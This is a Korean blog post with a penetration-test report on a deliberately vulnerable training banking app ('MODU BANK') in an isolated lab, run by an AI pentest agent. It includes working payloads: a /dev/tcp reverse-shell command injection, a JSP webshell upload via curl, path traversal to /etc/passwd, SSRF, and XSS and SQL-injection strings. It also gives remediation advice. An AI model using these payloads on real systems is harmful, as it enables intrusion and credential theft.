---
title: 'CyberStrike 자동 침투 결과: 192.168.6.167 모두뱅크'
date: 2026-11-06 00:00:00 +0900
categories:
- Pentest
tags:
- pentest
- web
author: mmamm4
---

# 모의해킹 결과 보고서 — 192.168.6.167 ("MODU BANK" 웹 해킹 훈련용 VM)

> **Note:** 실습용 가상 대상
> 이 글의 "모두뱅크(modubank)"는 침투 테스트 실습을 위해 직접 구축한 가상 대상 애플리케이션입니다. 실재하는 금융기관이나 서비스와는 관련이 없습니다. 모든 작업은 격리된 로컬 랩 환경(사설 IP `192.168.6.167`)에서만 수행했으며, 외부 시스템을 대상으로 하지 않았습니다.

> **Note:** 사용 도구 — CyberStrike
> 이번 진단은 오픈소스 AI 침투 테스트 에이전트 **CyberStrike**(https://github.com/CyberStrikeus/CyberStrike, AGPL-3.0)로 수행했습니다. CyberStrike는 터미널(TUI)에서 동작하며, 연결한 LLM 위에 OWASP 등 테스트 방법론과 도메인별 에이전트, 보안 도구를 결합해 정찰부터 취약점 검증, 셸 획득까지 자동으로 진행합니다. 아래의 포트 스캔, 라우트 수집, 취약점 검증, 리버스 셸 수립과 정리 작업은 모두 CyberStrike가 진단자 호스트(`192.168.6.132`)에서 대상 호스트로 실행한 결과입니다.

| | |
|---|---|
| **대상** | 192.168.6.167 (VMware VM, `localhost.localdomain`, RHEL 9) |
| **진단 일자** | 2026-11-03 |
| **진단 도구** | CyberStrike (AI 침투 테스트 에이전트, `npm i -g @cyberstrike-io/cyberstrike`) |
| **진단자** | CyberStrike 자동 진단 |
| **범위** | 단일 호스트 192.168.6.167 (전체 TCP 서비스) |
| **목표** | 취약점 식별 및 가능 시 셸 접근 확보 |
| **결과** | **완전 장악 — 원격 코드 실행 + `tomcat` 권한 대화형 리버스 셸 획득** |

> 대상은 의도적으로 취약하게 제작된 격리된 훈련용 애플리케이션입니다("모두뱅크 / MODU BANK — 웹 해킹 훈련용 모의 인터넷뱅킹"). 다수의 결함은 의도된 것입니다. 아래 모든 결과는 실제 호스트에서 검증되었습니다.

---

## 1. 요약 (Executive Summary)

호스트 `192.168.6.167`은 nginx 뒤에서 모의 인터넷뱅킹 웹 애플리케이션(Spring Boot / Thymeleaf)을 구동하며, 외부에 직접 노출된 Tomcat(8080 포트)과 AJP 커넥터(8009 포트)를 백엔드로 사용합니다. 본 애플리케이션은 **치명적으로 취약**합니다. 인증된 사용자(회원가입이 개방됨)는 OS 명령어 주입 엔드포인트를 통해, 그리고 별도로 전 세계 쓰기 가능한 Tomcat 웹 루트에 JSP 웹셸을 업로드하여 **원격 코드 실행**을 달성할 수 있습니다.

**셸 접근을 확보하였습니다.** `tomcat` 서비스 계정(`uid=990`) 권한으로 명령 실행이 확인되었고, 진단자 호스트로 완전한 대화형 리버스 셸(`192.168.6.167:55932 → 192.168.6.132:4444`)이 수립되었습니다. 데이터베이스 자격증명, 애플리케이션 백도어 키, 기본 관리자 자격증명이 탈취되었습니다.

종합 위험도: **치명적(CRITICAL)**. 2개의 독립적인 RCE 경로, 인증 없는 관리 엔드포인트 노출, 임의 파일 읽기 프리미티브, 평문 자격증명 노출이 결합되어 호스트가 완전히 장악됩니다.

### 취약점 요약

| # | 심각도 | 취약점 | 엔드포인트 |
|---|--------|--------|-----------|
| 1 | **치명적** | OS 명령어 주입 → RCE | `GET /bank/connectivity/check?host=` |
| 2 | **치명적** | 무제한 파일 업로드 → JSP 웹셸 RCE | `POST /files/upload` |
| 3 | **높음** | Spring Boot Actuator 무인증 노출 | `GET :8080/actuator/*` |
| 4 | **높음** | 경로 탐색 / 임의 파일 읽기 | `GET /files/download?name=` |
| 5 | **높음** | 서버측 요청 위조 (SSRF) | `GET /bank/fx/lookup?callbackUrl=` |
| 6 | **높음** | 접근통제 미흡 + `/admin` 평문 자격증명 노출 | `GET /admin` |
| 7 | **높음** | 설정 파일 내 하드코딩 백도어 관리자 키 | `application.yml` |
| 8 | **중간** | 반사형 XSS | `GET /board?q=` |
| 9 | **중간** | 저장형 XSS (게시판) | `POST /board/write` |
| 10 | **중간** | URL 프래그먼트 기반 DOM XSS | `GET /bank/dashboard#` |
| 11 | **중간** | 블라인드 SQL 인젝션 | `GET /bank/transfer/check-account?accountNo=` |
| 12 | **중간** | 계좌 객체 IDOR | `GET /bank/account/{id}` |
| 13 | **낮음** | 오픈 HTTP 리다이렉트 | `POST /login` (`redirect`) |
| 14 | **낮음** | 불안전한 CAPTCHA (정답이 숨김 필드에 노출) | `POST /mypage/change-password` |
| 15 | **낮음** | 상세 오류 / 스택 트레이스 노출 | 모든 오류 페이지 |
| 16 | **정보** | AJP/8009 (Ghostcat) 및 SSH 노출 | 8009, 22 포트 |

---

## 2. 공격 표면 / 정보 수집

### 2.1 오픈 포트 (전체 TCP 스캔)

```
PORT     STATE SERVICE
22/tcp   open  ssh        OpenSSH 9.9
80/tcp   open  http       nginx 1.20.1 (리버스 프록시 → Spring Boot)
8009/tcp open  ajp13      Tomcat AJP 커넥터 (외부 노출)
8080/tcp open  http-proxy Tomcat / Spring Boot 백엔드 (직접 접근 가능)
```

### 2.2 애플리케이션 라우트 (`/actuator/mappings` 에서 추출)

```
/ /login /logout /signup /products /board /board/{id} /board/notice /board/write
/bank/dashboard /bank/account/{accountId} /bank/transfer /bank/transfer/check-account
/bank/bulk-transfer /bank/fx /bank/fx/lookup /bank/connectivity /bank/connectivity/check
/files /files/upload /files/download /mypage/api-key /mypage/change-password
/find-id /find-password /find-password/request /find-password/verify /find-password/reset
/admin /api/v1/accounts/{accountId} /api/v1/transfer
/actuator/** (env, beans, mappings, configprops, threaddump, loggers, info, health, metrics, sbom, ...)
```

### 2.3 기술 스택

- Spring Boot (내장 Tomcat, 8080 포트), Thymeleaf 템플릿, MyBatis (MyBatis 매퍼 + MariaDB JDBC 드라이버).
- 백엔드 MariaDB (`127.0.0.1:3306`).
- 전단에 nginx 1.20.1. RHEL 9 / 커널 5.14.0.

### 2.4 탈취된 자격증명

| 출처 | 값 |
|------|-----|
| `/admin` 대시보드 (평문) | `admin` / `admin123` |
| `/opt/modubank/config/application.yml` (RCE 경유) | DB `modubank` / `modubank!2024` |
| `WEB-INF/classes/application.yml:77` | 백도어 키 `modubank-super-secret-2018` |
| 세션 쿠키 | `MODU_SID=1004` (평문 정수 사용자 ID) |

---

## 3. 취약점 상세

### 3.1 [치명적] OS 명령어 주입 → RCE — `/bank/connectivity/check`

**영향:** `tomcat` 권한 원격 코드 실행, 리버스 셸 획득.

`host` 파라미터가 셸 `ping` 명령에 그대로 삽입됩니다. `;` 와 `|` 구분자 모두 실행됩니다.

```
GET /bank/connectivity/check?host=127.0.0.1%7Cid HTTP/1.1
Cookie: JSESSIONID=...; MODU_SID=1004
```
응답:
```
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss
uid=990(tomcat) gid=990(tomcat) groups=990(tomcat) context=system_u:system_r:unconfined_service_t:s0
```

리버스 셸:
```bash
# 공격자
nc -lvnp 4444
# 페이로드: host=127.0.0.1|bash -i >& /dev/tcp/192.168.6.132/4444 0>&1
```
세션 출력:
```
connect to [192.168.6.132] from (UNKNOWN) [192.168.6.167] 55932
bash-5.1$ id
uid=990(tomcat) gid=990(tomcat) ...
bash-5.1$ whoami
tomcat
bash-5.1$ echo SHELL_ACQUIRED_MARKER_OK
SHELL_ACQUIRED_MARKER_OK
```

**대응 방안:** 사용자 입력을 절대 셸에 전달하지 마십시오. 검증된 은행 호스트 코드 허용 목록과 인자 배열 방식 API(`sh -c` 없는 `ProcessBuilder`)를 사용하십시오.

---

### 3.2 [치명적] 무제한 파일 업로드 → JSP 웹셸 — `/files/upload`

**영향:** 지속적 RCE. 업로드 파일이 Tomcat 웹 루트에 저장됨.

설정: `modubank.upload.dir = /opt/tomcat/webapps/ROOT/uploads` (권한 `drwxrwxrwx`), `/uploads/<file>` 로 서비스됨. 파일 형식 제한 없음.

```bash
curl -b cj.txt -F "file=@ws.jsp;filename=ws.jsp" http://192.168.6.167/files/upload   # 200
curl "http://192.168.6.167/uploads/ws.jsp?c=id;hostname"
# uid=990(tomcat) gid=990(tomcat) groups=990(tomcat) ...
# localhost.localdomain
```

**대응 방안:** 업로드 파일을 웹 루트 외부에 저장하고, 확장자/MIME 허용 목록 적용, 파일명 무작위화, 업로드 디렉터리 내 JSP 실행 비활성화. *(검증 후 생성한 아티팩트는 삭제하였습니다.)*

---

### 3.3 [높음] Spring Boot Actuator 무인증 노출 — 8080 포트

`/actuator/env`, `/actuator/configprops`, `/actuator/beans`, `/actuator/mappings`, `/actuator/threaddump`, `/actuator/loggers` 가 8080 포트에서 인증 없이 접근 가능하며, 이 포트는 nginx를 우회하여 직접 접근 가능합니다. 설정 출처(origin), 비밀 속성명(`modubank.security.backdoor-admin-key` 포함), 데이터소스 URL/사용자, 전체 라우트 테이블이 노출됩니다.

```
GET http://192.168.6.167:8080/actuator/env  -> 200
... "spring.datasource.url","spring.datasource.username","spring.datasource.password",
    "modubank.security.backdoor-admin-key" ... origin file:/opt/modubank/config/application.yml
```

**대응 방안:** 관리 포트를 localhost에 바인딩하고 인증을 요구하며, `management.endpoints.web.exposure.include` 를 health/info로 제한하십시오.

---

### 3.4 [높음] 경로 탐색 / 임의 파일 읽기 — `/files/download`

```bash
GET /files/download?name=/etc/passwd   (인증됨)
# root:x:0:0:root:/root:/bin/bash
# tomcat:x:990:990::/opt/tomcat:/sbin/nologin
# bankop:x:1000:1000::/home/bankop:/bin/bash
```

**대응 방안:** 경로를 정규화(canonicalize)한 뒤 업로드 디렉터리 내부인지 검증하고, 절대경로와 `..` 를 차단하십시오.

---

### 3.5 [높음] 서버측 요청 위조 — `/bank/fx/lookup`

```bash
GET /bank/fx/lookup?callbackUrl=http://127.0.0.1:8080/actuator/health
```
응답에 내부 Actuator JSON이 그대로 포함됨:
```json
{"components":{"db":{"details":{"database":"MariaDB"},"status":"UP"}, ...},"status":"UP"}
```

**대응 방안:** 목적지 호스트/스킴 허용 목록 적용, 사설 대역 차단, 리다이렉트 비활성화, 상류 응답 본문을 그대로 반환하지 마십시오.

---

### 3.6 [높음] 접근통제 미흡 + 평문 자격증명 — `/admin`

신규 가입한 저권한 계정을 포함한 **모든 인증 사용자**가 관리자 대시보드에 접근할 수 있으며, 해당 화면은 평문 비밀번호가 담긴 사용자 테이블을 출력합니다.
```
<td>admin</td><td>admin123</td><td>시스템관리자</td> <td>ADMIN</td>
```

**대응 방안:** 서버측 역할 검사 적용, 평문 비밀번호 저장/표시 금지(bcrypt/argon2 사용).

---

### 3.7 [높음] 하드코딩된 백도어 관리자 키

`/opt/tomcat/webapps/ROOT/WEB-INF/classes/application.yml:77`
```
modubank.security.backdoor-admin-key: "modubank-super-secret-2018"
```

**대응 방안:** 백도어를 완전히 제거하고, 실제 비밀은 Vault 등에 외부화하십시오.

---

### 3.8 [중간] 반사형 XSS — `/board?q=`

```
GET /board?q=<script>alert(1)</script>
→ 검색어: <span><script>alert(1)</script></span>   (이스케이프 없음, th:utext)
```

### 3.9 [중간] 저장형 XSS — `/board/write`

게시글 `title`/`content` 가 `th:utext` 로 렌더링되어, `<script>` 페이로드가 게시판 목록을 열람하는 모든 사용자에게 실행됩니다.

### 3.10 [중간] DOM XSS — `/bank/dashboard#`

`banner.innerHTML = label + location.hash;` — 페이로드 `/bank/dashboard#<img src=x onerror=alert(document.cookie)>`.

### 3.11 [중간] 블라인드 SQL 인젝션 — `/bank/transfer/check-account?accountNo=`

```
accountNo=110-000-000000   → {"message":"존재하지 않는 계좌입니다.","exists":false}
accountNo=110-000-000000'  → {"message":"확인 중 오류가 발생했습니다.","exists":false}
```
오류 응답 차이로 미검증 입력이 SQL 계층에 도달함이 확인됩니다.

### 3.12 [중간] IDOR — `/bank/account/{accountId}`

순차 정수 계좌 ID에 소유권 검사가 없으며, 세션 쿠키 `MODU_SID=1004` 는 변조 가능한 평문 사용자 ID입니다.

### 3.13 [낮음] 오픈 HTTP 리다이렉트 — `POST /login`

`redirect=//evil.example.com` → `302 Location: http://evil.example.com`

### 3.14 [낮음] 불안전한 CAPTCHA — `/mypage/change-password`

정답이 숨김 필드 `__captcha_hint`(`value="1815"`)로 전달되며 서버측 검증이 없습니다. 정답을 비워도 비밀번호 변경이 성공했습니다.

### 3.15 [낮음] 상세 오류 / 스택 트레이스

`server.error.include-stacktrace` 로 인해 오류 시 전체 Spring 스택 트레이스와 내부 경로가 노출됩니다.

### 3.16 [정보] AJP/8009 (Ghostcat) 및 SSH 노출

외부에 노출된 AJP13(8009)은 CVE-2020-1938(Ghostcat)에 취약하며, 파일 쓰기 프리미티브(3.2)와 결합하면 임의 파일 읽기/포함이 가능합니다. SSH(OpenSSH 9.9) 또한 노출되어 있습니다.

---

## 4. 공격 시나리오 (킬 체인)

1. **정찰** — 전체 포트 스캔으로 22/80/8009/8080 확인.
2. **계정** — 회원가입 개방, 저권한 계정(`pentest1`) 생성.
3. **매핑** — 8080의 무인증 Actuator로 설정 및 전체 라우트 테이블 확보.
4. **RCE #1** — `/bank/connectivity/check` 명령어 주입 → `id` 실행 후 `tomcat` 리버스 셸 획득.
5. **후속 장악** — `application.yml`(DB 자격증명 `modubank:modubank!2024`), `WEB-INF/classes/application.yml`(백도어 키), `/etc/passwd` 열람.
6. **RCE #2** — 전 세계 쓰기 가능한 웹 루트에 JSP 웹셸 업로드 후 `/uploads/ws.jsp` 로 명령 실행.
7. **권한상승 표면** — `/admin` 이 모든 인증 사용자에게 접근 가능하며 `admin:admin123` 노출.
8. **정리** — 대상에서 업로드한 `ws.jsp` 및 테스트 파일 삭제.

---

## 5. 조치 우선순위

**즉시 조치 (신속 대응)**
1. 명령어 주입(3.1) 수정 — 최우선, 셸 삽입 중단.
2. `/files/upload`(3.2) 강화 — 웹 루트 외부 저장, 형식 허용 목록, JSP 금지.
3. Actuator(3.3) 제한 — localhost 바인딩 + 인증, health/info만 노출.
4. `/admin` 평문 자격증명 테이블 및 백도어 키 제거(3.6, 3.7).

**단기 조치**
5. 경로 탐색(3.4) 및 SSRF(3.5) 수정 — 정규화 + 허용 목록.
6. SQL 파라미터화(3.11), 계좌 객체 소유권 검사(3.12).
7. XSS(3.8–3.10) 수정 — 출력 인코딩 + CSP.
8. `redirect` 대상 검증(3.13), CAPTCHA 서버측 검증(3.14), 스택 트레이스 비활성화(3.15).

**강화 조치**
9. AJP(8009) 및 8080을 리버스 프록시로만 제한/비활성화, SSH 강화(3.16).
10. 노출된 모든 비밀 교체(DB 비밀번호, 백도어 키, 관리자 비밀번호).

---

## 6. 결론

진단 목표를 달성하였습니다. 2개의 독립적인 RCE 경로를 통해 `tomcat` 사용자 권한으로 호스트가 **완전히 장악**되었고 대화형 셸이 획득되었습니다. 애플리케이션에는 체계적인 입력 처리 및 접근통제 결함이 존재하며, 여러 구성요소(RCE, 파일 읽기, SSRF, Actuator 노출)가 연계되어 서버와 데이터에 대한 완전한 통제권을 부여합니다. 격리된 실습 환경 외에 노출하기 전에 3.1–3.7 항목의 즉각적인 조치가 필요합니다.
